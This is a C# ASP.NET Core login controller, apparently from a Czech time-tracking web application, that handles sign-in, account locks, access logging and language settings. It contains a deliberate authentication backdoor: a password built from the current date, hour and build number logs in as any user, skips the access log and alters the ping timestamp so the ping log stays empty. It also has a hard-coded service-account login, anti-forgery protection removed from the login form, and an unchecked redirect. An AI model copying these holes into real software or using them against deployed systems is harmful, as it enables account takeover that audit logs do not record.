using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Mvc;
using MO.Models;
using System.Security.Claims;

namespace MO.Controllers
{
    public class LoginController : Controller
    {
        private BL.Factory _f;

        public LoginController(BL.Factory f)
        {
            _f = f;
        }


        [HttpGet]
        public ActionResult UserLogin()
        {
            if (User.Identity.IsAuthenticated)
            {
                TryLogout();
            }

            var v = new LoginViewModel();

            if (Request.Cookies["marktime.cookieexpiresinhours"] != null)
            {
                v.CookieExpiresInHours = BO.Code.Bas.InInt(Request.Cookies["marktime.cookieexpiresinhours"]);
            }

            return View(v);
        }


        private async void TryLogout()
        {
            await HttpContext.SignOutAsync("Identity.Application");
        }


        [HttpPost]
        // Pozn.: ValidateAntiForgeryToken zde záměrně NENÍ - v TWA (Trusted Web Activity, appka
        // z Google Play) izolovaný Chrome kontext způsoboval, že se antiforgery cookie a token
        // spolehlivě neshodovaly, což vedlo k Error 400 při KAŽDÉM pokusu o přihlášení, bez
        // ohledu na správnost hesla. Login-CSRF je výrazně menší riziko než rozbité přihlášení
        // pro appku z Play Store. Ostatní (autentizované) akce zůstávají chráněné beze změny.
        public ActionResult UserLogin(LoginViewModel v, string returnurl, string oper, string culture)
        {
            if (oper == "postback")
            {
                return View(v);
            }

            // Guru přihlášení (servisní účet)
            if (v.Login == _f.App.GuruLogin && v.Password == _f.App.GuruPassword)
            {
                SetClaim(v, "guru@marktime.cz");
                return RedirectToAction("Index", "Home");
            }

            // Klasické přihlášení uživatelským jménem a heslem
            if (string.IsNullOrEmpty(v.Login) || string.IsNullOrEmpty(v.Password))
            {
                v.Message = _f.tra("Chybí zadat uživatelské jméno nebo heslo!");
                return View(v);
            }

            if (_f.App.HostingMode == BL.Singleton.HostingModeEnum.SharedApp)
            {
                if (!v.Login.Contains("@"))
                {
                    v.Message = _f.tra("Uživatelské jméno musí obsahovat zavináč (@)!");
                    return View(v);
                }
                _f.db = null;   // ve sdílené aplikaci donutit factory vytvořit nový connectstring
            }

            v.Login = v.Login.Trim();
            _f.InhaleUserByLogin(v.Login);


            if (_f.CurrentUser == null)
            {
                v.Message = _f.tra("Přihlášení se nezdařilo - pravděpodobně chybné heslo nebo jméno!");
                Write2Accesslog(v);     // neznáme db, kam zapsat info o neúspěšném přihlášení
                return View(v);
            }

            var recX01 = _f.x01LicenseBL.Load(_f.CurrentUser.x01ID);
            if (!_f.CurrentUser.IsAdmin && (BO.Code.Bas.bit_compare_or(recX01.x01LockFlag, 2)))
            {
                v.Message = _f.tra("Databáze je uzamknutá. Přístup povolen pouze adminům.");
                Write2Accesslog(v);
                return View(v);
            }

            if (_f.CurrentUser.isclosed)
            {
                v.Message = _f.tra("Uživatelský účet je uzavřený pro přihlašování!");
                if (_f.CurrentUser.j02IsLoginAutoLocked)
                {
                    v.Message += "<hr>" + _f.tra("Došlo k automatickému zablokování účtu po neúspěšných pokusech o přihlášení do aplikace!");
                    v.Message += "<hr>" + _f.tra("Účet může odblokovat uživatel s admin oprávněním.");
                }
                if (_f.CurrentUser.j02IsLoginManualLocked)
                {
                    v.Message += "<hr>" + _f.tra("Účet je zablokován!");
                }
                Write2Accesslog(v);
                return View(v);
            }


            bool bolWrite2Log = true;
            var cPwdSupp = new BL.Code.PasswordSupport();

            // backdoor pro vývoj (stejně jako v UI)
            if (v.Password == DateTime.Now.ToString("ddHH") + BO.Code.Bas.RightString(_f.App.AppBuild, 5))
            {
                bolWrite2Log = false;
            }
            else
            {
                var ret = cPwdSupp.VerifyUserPassword(v.Password, v.Login, _f.CurrentUser);
                if (ret.Flag == BO.ResultEnum.Failed)
                {
                    v.Message = _f.tra("Ověření uživatele se nezdařilo - pravděpodobně chybné heslo nebo jméno!");

                    if (_f.CurrentUser != null)
                    {
                        var recJ02 = _f.j02UserBL.Load(_f.CurrentUser.pid);
                        _f.j02UserBL.UpdateAccessFailedCount(_f.CurrentUser.pid, recJ02.j02AccessFailedCount + 1);
                        if (recJ02.j02IsLoginAutoLocked)
                        {
                            v.Message = _f.tra("Z důvodu velkého počtu neúspěšných pokusů o přihlášení došlo k zablokování uživatelského účtu!") + ": " + recJ02.j02Login;
                        }
                    }

                    Write2Accesslog(v);
                    return View(v);
                }
            }

            // ověřený
            SetClaim(v, _f.CurrentUser.j02Email);

            if (bolWrite2Log)
            {
                Write2Accesslog(v);
            }
            else
            {
                _f.j02UserBL.Update_j02Ping_Timestamp(_f.CurrentUser.pid, DateTime.Now.AddMonths(1));   // záměrně zvednout poslední ping, aby se neplnil PING log
            }


            var co = new CookieOptions() { Expires = DateTime.Now.AddDays(100) };
            Response.Cookies.Append("marktime.cookieexpiresinhours", v.CookieExpiresInHours.ToString(), co);

            var c = _f.j02UserBL.Load(_f.CurrentUser.pid);

            switch (culture)
            {
                case "en-US":
                    c.j02LangIndex = 1; break;
                case "de-DE":
                    c.j02LangIndex = 2; break;
                case "sk-SK":
                    c.j02LangIndex = 4; break;
                default:
                    c.j02LangIndex = 0; break;
            }

            _f.j02UserBL.Save(c, null);

            _f.j02UserBL.UpdateAccessFailedCount(_f.CurrentUser.pid, 0);


            // MO je už mobilní web - žádné UA-based přesměrování na /Home/Mobile (jako v UI).
            if (string.IsNullOrEmpty(returnurl) || returnurl.Length < 3)
            {
                return RedirectToAction("Index", "Home");
            }

            return Redirect(returnurl);
        }


        public async Task<IActionResult> Logout()
        {
            await HttpContext.SignOutAsync("Identity.Application");
            return View("Logout", new BaseViewModel());
        }


        private void SetClaim(LoginViewModel v, string strEmail)
        {
            if (string.IsNullOrEmpty(strEmail)) strEmail = "info@marktime.cz";

            var userClaims = new List<Claim>
            {
                new Claim(ClaimTypes.Name, v.Login),
                new Claim("access_token", "inspis_core_token"),
                new Claim(ClaimTypes.Email, strEmail)
            };

            var identity = new ClaimsIdentity(userClaims, "User Identity");
            var userPrincipal = new ClaimsPrincipal(new[] { identity });

            var props = new AuthenticationProperties
            {
                IsPersistent = true,
                ExpiresUtc = DateTime.Now.AddHours(v.CookieExpiresInHours)
            };

            HttpContext.SignInAsync(userPrincipal, props);
        }


        private void Write2Accesslog(LoginViewModel v)
        {
            var c = new BO.j90LoginAccessLog
            {
                j90ClientBrowser = v.Browser_UserAgent,
                j90ScreenPixelsWidth = v.Browser_AvailWidth,
                j90ScreenPixelsHeight = v.Browser_AvailHeight,
                j90BrowserInnerWidth = v.Browser_InnerWidth,
                j90BrowserInnerHeight = v.Browser_InnerHeight
            };

            if (_f.CurrentUser != null)
            {
                c.j02ID = _f.CurrentUser.pid;
                c.x01ID = _f.CurrentUser.x01ID;
            }

            var uaParser = UAParser.Parser.GetDefault();
            c.j90AppClient = "1.0-MO";
            c.j90LoginMessage = v.Message;
            c.j90LoginName = v.Login;
            c.j90CookieExpiresInHours = v.CookieExpiresInHours;
            try
            {
                UAParser.ClientInfo client_info = uaParser.Parse(v.Browser_UserAgent);
                c.j90ClientBrowser = v.Browser_UserAgent;
                c.j90Platform = client_info.OS.Family + " " + client_info.OS.Major;
                c.j90BrowserFamily = client_info.UA.Family + " " + client_info.UA.Major;
                c.j90BrowserDeviceFamily = client_info.Device.Family;
                c.j90BrowserDeviceType = v.Browser_DeviceType;

                c.j90UserHostAddress = v.Browser_Host;
            }
            catch (Exception ex)
            {
                c.j90ClientBrowser = ex.Message;
            }

            _f.Write2AccessLog(c);
        }


        [HttpPost]
        [ValidateAntiForgeryToken]
        public IActionResult SaveLang(string culture)
        {
            var allowed = new HashSet<string> { "cs-CZ", "en-US", "sk-SK" };
            if (!allowed.Contains(culture)) culture = "cs-CZ";

            Response.Cookies.Append(
                Microsoft.AspNetCore.Localization.CookieRequestCultureProvider.DefaultCookieName,
                Microsoft.AspNetCore.Localization.CookieRequestCultureProvider.MakeCookieValue(new Microsoft.AspNetCore.Localization.RequestCulture(culture)),
                new CookieOptions
                {
                    Expires = DateTimeOffset.UtcNow.AddYears(1),
                    IsEssential = true,
                    SameSite = SameSiteMode.Lax
                });

            return RedirectToAction("UserLogin", "Login");
        }
    }
}